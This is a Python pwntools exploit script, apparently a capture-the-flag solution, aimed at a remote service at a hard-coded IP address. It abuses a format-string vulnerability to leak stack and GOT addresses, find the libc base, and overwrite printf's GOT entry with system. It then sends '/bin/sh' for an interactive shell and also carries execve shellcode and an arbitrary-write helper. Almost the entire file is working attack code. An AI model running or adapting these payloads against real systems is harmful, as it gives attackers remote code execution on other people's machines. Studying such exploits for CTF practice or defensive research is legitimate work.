#coding=utf-8
__author__="rocky"
payload="%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|"
from pwn import *


p=remote('218.2.197.235',23745)
libc=ELF('./libc.so.2-13')
p.recvuntil('\n')
# 2 18 50 56
n=56
p.sendline("|%2$x|%21$x|%69$x|%"+str(n)+"$x")

a=p.recvuntil('\n')
#print a

stack2= int(a.split('|')[1],16)
#print 'stack2:',hex(stack2)

point1= int(a.split('|')[2],16)
#print 'point1:',hex(point1)

point2= int(a.split('|')[3],16)
#print 'point2:',hex(point2)

esp=stack2-25*4
#print 'esp:',hex(esp)
# for i in range(100):
# 	print hex(esp+i*4)

ret= int(a.split('|')[4],16)
#print 'ret:',hex(ret)



shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"

shellcode += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"

shellcode += "\x0b\xcd\x80"

#printf_got: 0x8049974: 0xf75d6020
	#---------------------
#覆盖返回地址
def wd(address, data):
    for ff in range(4):
        t = (data>>(ff*8))&0xff
        payload = r"%" + str(t) + r"d%12$hhn"
        payload = payload.ljust(20, "A")
        payload += p32(address + ff)
        print payload
        p.sendline(payload)
    print 'write complete'
#dump real address
#
printf_got=0x8049974
payload='A'*20+p32(printf_got)+'|%12$s|'
p.sendline(payload)
data=p.recvuntil('\n')
print data
printf_addr=u32(data[25:29])
print "printf_addr",": ",hex(printf_addr)

libc.address=printf_addr-libc.symbols['printf']
print "libc.address",": ",hex((libc.address))
system_addr=libc.symbols['system']
print "system_addr",": ",hex((system_addr))

system_l=system_addr&0xffff
system_h=system_addr>>16
print hex(system_h),hex(system_l)

payload='%'+str(system_l)+'c%14$hn'+'%'+str(system_h-system_l)+'c%15$hn'
print len(payload)
payload=payload.ljust(28,'A')
payload+=p32(printf_got)+p32(printf_got+0x2)
print payload
p.sendline(payload)

p.sendline('/bin/sh')
p.interactive()
# for i in range(len(shellcode)/4+1):
# 	wd(shellcode_addr+4*i, u32(shellcode[i*4:(i+1)*4].ljust(4,'\x90')))

# p.sendline("|%"+str(n)+"$x")
# ret_addr1= int(a.split('|')[1],16)
# print 'ret_addr1:',hex(ret_addr1)
	#---------------------
	# for i in range(500):
	# 	ret_addr=esp+4*n
	# 	print 'ret_addr:',hex(ret_addr)
	# 	print i
	# 	wd(ret_addr, shellcode_addr)
	#printf 49020
	# print "start"
	

#08049900
# 0xe48304
 # FF 25 0C A0 04 08
 # FF 25 10 A0 04 08
 # FF 25 14 A0 04 08
 # FF 25 18 A0 04 08
 # FF 25 1C A0 04 08
 # FF 25 FC 9F 04 08

#

	# print '----------------------------'
	# for i in range(200):
	# 	payload="%"+str(i)+"$p"
	# 	p.sendline(payload)
	# p.interactive()



	# print '----------------------------'
	# for i in range(200):
	# 	payload="%"+str(i)+"$p"
	# 	p.sendline(payload)
	# p.interactive()

